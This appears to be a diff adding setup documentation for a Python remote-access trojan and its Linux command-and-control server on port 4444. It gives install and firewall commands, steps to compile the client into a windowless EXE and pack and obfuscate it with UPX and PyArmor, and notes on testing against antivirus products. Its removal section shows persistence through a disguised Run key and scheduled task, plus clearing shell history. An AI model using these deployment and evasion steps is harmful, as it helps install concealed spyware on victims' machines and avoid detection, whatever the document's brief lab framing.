@@ -1,0 +1,408 @@
+═══════════════════════════════════════════════════════════════════════════════════
+REQUIREMENTS & DEPENDENCIES
+═══════════════════════════════════════════════════════════════════════════════════
+
+WINDOWS TARGET REQUIREMENTS:
+──────────────────────────────
+
+Operating System:
+- Windows 10 (Build 19041+) OR
+- Windows 11 (Any build)
+
+Python Installation:
+- Python 3.9 or higher (3.11+ recommended)
+- Download from: https://www.python.org/downloads/
+- Install with "Add Python to PATH" checkbox enabled
+- Verify: python --version
+
+Required Python Packages:
+- socket (built-in)
+- subprocess (built-in)
+- json (built-in)
+- os (built-in)
+- sys (built-in)
+- time (built-in)
+- threading (built-in)
+- pathlib (built-in)
+- getpass (built-in)
+- psutil (install via pip)
+- pillow (install via pip)
+- winreg (Windows built-in)
+- ctypes (Windows built-in)
+
+Installation command for external packages:
+pip install psutil pillow
+
+Verify all packages:
+python -c "import socket, subprocess, json, os, sys, time, threading, pathlib, getpass, psutil, PIL, winreg, ctypes; print('✓ All packages installed')"
+
+
+LINUX C2 SERVER REQUIREMENTS:
+──────────────────────────────
+
+Operating System:
+- Ubuntu 20.04+ OR
+- Kali Linux 2021.3+ OR
+- Debian 11+ OR
+- Other Linux distributions
+
+Python Installation:
+- Python 3.9 or higher (3.11+ recommended)
+- Most Linux distributions include Python
+- Verify: python3 --version
+
+System Packages:
+- Likely already installed:
+  * socket (standard library)
+  * threading (standard library)
+  * json (standard library)
+  * sys (standard library)
+  * datetime (standard library)
+  * pathlib (standard library)
+
+No external Python packages required for C2 server!
+
+Installation verification (Linux):
+python3 -c "import socket, threading, json, sys, datetime, pathlib; print('✓ All libraries available')"
+
+
+COMPILATION TOOLS (Optional - for creating .exe):
+────────────────────────────────────────────────
+
+On Windows, if you want to compile Python to standalone EXE:
+
+PyInstaller:
+pip install pyinstaller
+
+UPX (Binary compression):
+Download from: https://upx.github.io/
+Add to PATH
+
+PyArmor (Code obfuscation):
+pip install pyarmor
+
+Commands:
+pyinstaller --onefile --noconsole trojan_client.py
+upx dist/trojan_client.exe
+pyarmor obfuscate trojan_client.py
+
+
+NETWORK REQUIREMENTS:
+─────────────────────
+
+C2 Server:
+- Open port 4444 (TCP)
+- Firewall rule: sudo ufw allow 4444/tcp
+- Or in Windows: netsh advfirewall firewall add rule name="C2Server" dir=in action=allow protocol=tcp localport=4444
+
+Target Machine:
+- Outbound connectivity to C2 server IP:4444
+- Network isolation from internet (for lab testing)
+- No corporate proxy blocking traffic
+
+
+OPTIONAL - MONITORING TOOLS:
+──────────────────────────────
+
+For analyzing trojan traffic and behavior:
+
+Wireshark (Linux):
+sudo apt install wireshark
+Run: wireshark
+
+TCPDump (Linux):
+sudo tcpdump -i eth0 port 4444 -A
+
+Process Monitor (Windows):
+Download from SysInternals
+https://docs.microsoft.com/en-us/sysinternals/downloads/procmon
+
+Registry Editor (Windows):
+Built-in: regedit
+
+Event Viewer (Windows):
+Built-in: eventvwr.msc
+
+
+═══════════════════════════════════════════════════════════════════════════════════
+QUICK INSTALLATION SCRIPT
+═══════════════════════════════════════════════════════════════════════════════════
+
+WINDOWS TARGET SETUP (Run in PowerShell as Administrator):
+──────────────────────────────────────────────────────────
+
+# Install pip if needed
+python -m ensurepip --upgrade
+
+# Install required packages
+pip install --upgrade pip
+pip install psutil pillow
+
+# Verify installation
+python -c "import psutil; import PIL; print('✓ Installation successful')"
+
+# Create working directory
+New-Item -ItemType Directory -Path "C:\trojan_test" -Force
+cd C:\trojan_test
+
+# Now copy trojan_client.py here and run:
+python trojan_client.py
+
+
+LINUX C2 SERVER SETUP (Run in terminal):
+──────────────────────────────────────────
+
+# Create working directory
+mkdir -p ~/c2_server
+cd ~/c2_server
+
+# Python should be pre-installed, verify:
+python3 --version
+
+# Create necessary directories
+mkdir -p downloads screenshots logs
+
+# Set permissions
+chmod 750 downloads screenshots logs
+
+# Copy c2_server.py here and run:
+python3 c2_server.py
+
+
+═══════════════════════════════════════════════════════════════════════════════════
+TROUBLESHOOTING INSTALLATION
+═══════════════════════════════════════════════════════════════════════════════════
+
+WINDOWS:
+
+Problem: "python: command not found"
+Solution:
+  1. Reinstall Python from python.org
+  2. Enable "Add Python to PATH"
+  3. Restart PowerShell/CMD
+  4. Verify: python --version
+
+Problem: "pip: command not found"
+Solution:
+  python -m pip --version
+  python -m pip install <package>
+
+Problem: "ModuleNotFoundError: No module named 'psutil'"
+Solution:
+  pip install psutil --upgrade
+  Verify: python -c "import psutil; print('OK')"
+
+Problem: "Permission denied" when running trojan
+Solution:
+  Run PowerShell as Administrator
+  Or check file permissions: icacls trojan_client.py
+
+
+LINUX:
+
+Problem: "python3: command not found"
+Solution:
+  sudo apt update
+  sudo apt install python3 python3-pip
+
+Problem: "ModuleNotFoundError"
+Solution:
+  This shouldn't happen - all packages are built-in
+  If it does: python3 -c "import <module>" to debug
+
+Problem: "Permission denied" running c2_server.py
+Solution:
+  chmod +x c2_server.py
+  python3 c2_server.py (don't use ./)
+
+Problem: "Address already in use" on port 4444
+Solution:
+  sudo lsof -i :4444
+  sudo kill -9 <PID>
+  Or change port in c2_server.py
+
+
+═══════════════════════════════════════════════════════════════════════════════════
+FIREWALL CONFIGURATION
+═══════════════════════════════════════════════════════════════════════════════════
+
+LINUX UFW (Recommended):
+─────────────────────
+
+# Allow port 4444
+sudo ufw allow 4444/tcp
+
+# Verify
+sudo ufw status
+
+# To restrict to specific IP:
+sudo ufw allow from 192.168.1.50 to any port 4444
+
+# Disable rule
+sudo ufw delete allow 4444/tcp
+
+
+LINUX iptables:
+────────────────
+
+# Allow port 4444
+sudo iptables -A INPUT -p tcp --dport 4444 -j ACCEPT
+
+# Save rules
+sudo iptables-save > /etc/iptables/rules.v4
+
+# View current rules
+sudo iptables -L -n
+
+
+WINDOWS Firewall:
+──────────────────
+
+PowerShell (Administrator):
+netsh advfirewall firewall add rule name="C2Server" dir=in action=allow protocol=tcp localport=4444
+
+Or GUI:
+Settings → Privacy & Security → Windows Defender Firewall → Allow app through firewall
+
+
+═══════════════════════════════════════════════════════════════════════════════════
+SYSTEM COMPATIBILITY
+═══════════════════════════════════════════════════════════════════════════════════
+
+WINDOWS:
+────────
+
+Confirmed Working:
+✓ Windows 10 (21H2)
+✓ Windows 10 (20H2)
+✓ Windows 11 (21H2)
+✓ Windows 11 (22H2)
+
+Known Issues:
+❌ Windows 7/8: Requires Python 3.8 (end of life)
+❌ Windows XP/Vista: Not supported
+
+Antivirus Compatibility:
+✓ Tests against: Windows Defender, Kaspersky, Avast, AVG, McAfee
+(Trojan may be detected - this is expected)
+
+
+LINUX:
+───────
+
+Confirmed Working:
+✓ Ubuntu 20.04 LTS
+✓ Ubuntu 22.04 LTS
+✓ Kali Linux 2021.3+
+✓ Kali Linux 2024.1+
+✓ Debian 11 (Bullseye)
+✓ Debian 12 (Bookworm)
+✓ CentOS 8+
+
+Should Work:
+✓ Red Hat Enterprise Linux 8+
+✓ Fedora 33+
+✓ Arch Linux
+✓ Alpine Linux (minimal)
+
+
+═══════════════════════════════════════════════════════════════════════════════════
+PERFORMANCE SPECIFICATIONS
+═══════════════════════════════════════════════════════════════════════════════════
+
+Minimum System Requirements:
+
+Windows Target:
+- CPU: Dual-core 1.0 GHz
+- RAM: 2 GB
+- Disk: 50 MB free
+- Network: 100 Mbps (LAN recommended)
+
+Linux C2 Server:
+- CPU: Single-core 1.0 GHz
+- RAM: 512 MB
+- Disk: 100 MB (for logs/files)
+- Network: 100 Mbps (LAN recommended)
+
+Recommended:
+- CPU: Quad-core 2.0+ GHz
+- RAM: 4+ GB
+- Network: Gigabit Ethernet (stable connections)
+
+File Sizes:
+- trojan_client.py: ~25 KB
+- trojan_client.exe (compiled): ~15 MB
+- c2_server.py: ~20 KB
+- Log files: ~100 KB per hour of testing
+
+Network Usage:
+- Idle: ~0.1 KB/sec
+- Active command: ~1-10 KB per command
+- File transfer: Depends on file size
+- Screenshot: ~500 KB per screenshot
+
+
+═══════════════════════════════════════════════════════════════════════════════════
+VERSION COMPATIBILITY
+═══════════════════════════════════════════════════════════════════════════════════
+
+Python Versions:
+- Minimum: Python 3.7
+- Tested: Python 3.9, 3.10, 3.11, 3.12
+- Recommended: Python 3.11 or 3.12
+
+Major Changes by Version:
+- 3.7: First supported version (some deprecation warnings)
+- 3.8: Recommended for older systems
+- 3.9-3.12: Fully supported, no issues
+- 3.13+: Should work, not tested
+
+Package Version Requirements:
+- psutil: 5.9.0+
+- pillow: 8.0.0+
+
+
+═══════════════════════════════════════════════════════════════════════════════════
+UNINSTALL/REMOVAL
+═══════════════════════════════════════════════════════════════════════════════════
+
+To completely remove trojan testing system:
+
+WINDOWS:
+────────
+
+1. Delete files:
+   del C:\trojan_test\trojan_client.py
+   del C:\trojan_test\trojan_client.exe
+
+2. Remove persistence:
+   reg delete HKCU:\Software\Microsoft\Windows\CurrentVersion\Run /v SystemService
+
+3. Remove scheduled task:
+   schtasks /delete /tn SystemUpdate /f
+
+4. Remove packages (optional):
+   pip uninstall psutil pillow -y
+
+5. Delete directory:
+   rmdir /s C:\trojan_test
+
+
+LINUX:
+──────
+
+1. Stop C2 server:
+   killall python3
+
+2. Delete files:
+   rm -rf ~/c2_server
+
+3. Remove firewall rule:
+   sudo ufw delete allow 4444/tcp
+
+4. Clear logs:
+   rm -f ~/.bash_history
+   history -c
+
+
+═══════════════════════════════════════════════════════════════════════════════════
